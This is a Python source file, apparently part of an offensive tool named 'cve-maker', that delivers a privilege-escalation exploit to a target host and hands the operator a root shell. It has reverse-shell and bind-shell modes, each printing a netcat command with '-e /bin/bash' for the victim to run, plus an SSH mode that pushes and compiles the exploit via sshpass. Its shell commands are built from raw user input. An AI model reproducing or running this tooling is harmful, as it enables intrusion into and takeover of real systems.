#!/usr/bin/env python3

"""
https://github.com/msd0pe-1
Source code put in public domain by msd0pe, no Copyright
Any malicious or illegal activity may be punishable by law
Use at your own risk
"""

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class infos:
    INFO = "[" + bcolors.OCRA + bcolors.BOLD + "?" + bcolors.ENDC + bcolors.ENDC + "] "
    ERROR = "[" + bcolors.RED + bcolors.BOLD + "X" + bcolors.ENDC + bcolors.ENDC + "] "
    GOOD = "[" + bcolors.GREEN + bcolors.BOLD + "+" + bcolors.ENDC + bcolors.ENDC + "] "
    PROCESS = "[" + bcolors.BLUE + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.ENDC + "] "

try:
    import os

except ImportError:
    print("\n" + infos.ERROR + "Error. Have you installed the requirements properly?")
    print(infos.INFO + "Be sure to run the script as follows:")
    print(infos.INFO + "python3 cve-maker.py ....")
    print(infos.INFO + "./cve-maker.py ....\n")


def BindShell(name_ext, command, usage, edb):

    ip_target = input(infos.INFO + "> Enter the IP of the target : ")
    port_target = input(infos.INFO + "> Enter the PORT of the target to open : ")

    print("")
    print(infos.INFO + "Enter this command on the target : ")
    print("")
    print("    nc -lvp " + port_target + " > /tmp/" + name_ext + "; " + command + "; nc -lvp " + port_target + " -e /bin/bash&")
    print("")
    ready = input(bcolors.RED + bcolors.BOLD + "Press Enter to continue.\n" + bcolors.ENDC + bcolors.ENDC)

    print(infos.GOOD + "OPENING CONNECTION : " + ip_target + " on port " + port_target)
    print(infos.GOOD + "EXPLOIT SENDED : /tmp/" + name_ext)
    print("")
    print(infos.PROCESS + "YOU GOT A SHELL !")
    print(infos.INFO + "YOU CAN SPAWN A TTY SHELL WITH : " + bcolors.PURPLE + bcolors.BOLD + "python -c \'import pty; pty.spawn(\"/bin/sh\")\'" + bcolors.ENDC + bcolors.ENDC)
    print(infos.INFO + "TO GET A ROOT SHELL, TYPE : " + bcolors.PURPLE + bcolors.BOLD + usage + "\n\n" + bcolors.ENDC + bcolors.ENDC)
    os.system("nc " + ip_target + " " + port_target + " -q 600 < /tmp/exploit/" + name_ext + "; nc " + ip_target + " " + port_target)


def ReverseShell(name_ext, command, usage, edb):

    ip_host = input(infos.INFO + "> Enter your IP : ")
    port_host = input(infos.INFO + "> Enter your PORT to listen on : ")

    print("")
    print(infos.INFO + "Enter this command on the target ! ")
    print("")
    print("    nc " + ip_host + " " + port_host + " > /tmp/" + str(name_ext) + "; " + command + "; nc " + ip_host + " " + port_host + " -e /bin/bash")
    print("")

    print(infos.INFO + "YOU CAN SPAWN A TTY SHELL WITH : " + bcolors.PURPLE + bcolors.BOLD + "python -c \'import pty; pty.spawn(\"/bin/sh\")\'" + bcolors.ENDC + bcolors.ENDC)
    print(infos.INFO + "TO GET A ROOT SHELL, TYPE : " + bcolors.PURPLE + bcolors.BOLD + usage + "\n\n" + bcolors.ENDC + bcolors.ENDC)

    print(infos.PROCESS + "WAITING FOR A SHELL ...")
    os.system("nc -lvp " + port_host + " -q 600 < /tmp/exploit/" + str(name_ext) + "; nc -lvp " + port_host)


def SSH(name, name_ext, langage, command, usage, edb):

    ip_target = input(infos.INFO + "> Enter the IP of the target : ")
    username = input(infos.INFO + "> Enter the username to log in to : ")
    password = input(infos.INFO + "> Enter the password : ")

    print("")
    os.system("sshpass -p " + password + " scp /tmp/exploit/" + name_ext + " " + username + "@" + ip_target + ":/tmp/")
    print("") 
    print(infos.GOOD + "EXPLOIT COPIED : " + "/tmp/" + name_ext)

    if langage == "c++":
        os.system("sshpass -p " + password + " ssh " + username + "@" + ip_target + " \"nohup " + command + " > /dev/null 2>&1\"")
        print(infos.GOOD + "EXPLOIT COMPILED WITH SUCCESS : " + "/tmp/" + name)
        print("")
        print(infos.INFO + "TO GET A ROOT SHELL, TYPE : " + bcolors.PURPLE + bcolors.BOLD + usage + "\n" + bcolors.ENDC + bcolors.ENDC)
        os.system("sshpass -p " + password + " ssh " + username + "@" + ip_target)

    elif langage == "c":
        os.system("sshpass -p " + password + " ssh " + username + "@" + ip_target + " \"nohup " + command + " > /dev/null 2>&1\"")
        print(infos.GOOD + "EXPLOIT COMPILED WITH SUCCESS : " + "/tmp/" + name)
        print("")
        print(infos.INFO + "TO GET A ROOT SHELL, TYPE : " + bcolors.PURPLE + bcolors.BOLD + usage + "\n" + bcolors.ENDC + bcolors.ENDC)
        os.system("sshpass -p " + password + " ssh " + username + "@" + ip_target)

    else:
        print(infos.INFO + "TO GET A ROOT SHELL, TYPE : " + bcolors.PURPLE + bcolors.BOLD + usage + "\n" + bcolors.ENDC + bcolors.ENDC)
        os.system("sshpass -p " + password + " ssh " + username + "@" + ip_target)



def Menu(remote, name, name_ext, langage, command, usage, edb):

        print("")
        print(infos.INFO + "Choose a way to connect to the target : ")
        print("    1) Reverse Shell")
        print("    2) Bind Shell")
        print("    3) SSH")
        print("")

        choice = input(infos.INFO + "> Choice : ")
        print("")

        if choice == "1":
            ReverseShell(name_ext, command, usage, edb)


        elif choice == "2":
            BindShell(name_ext, command, usage, edb)

        elif choice == "3":
            SSH(name, name_ext, langage, command, usage, edb)

        else:
            print(infos.ERROR + "You must enter a valid choice ! Example: 1, 2 or 3")
            print("")

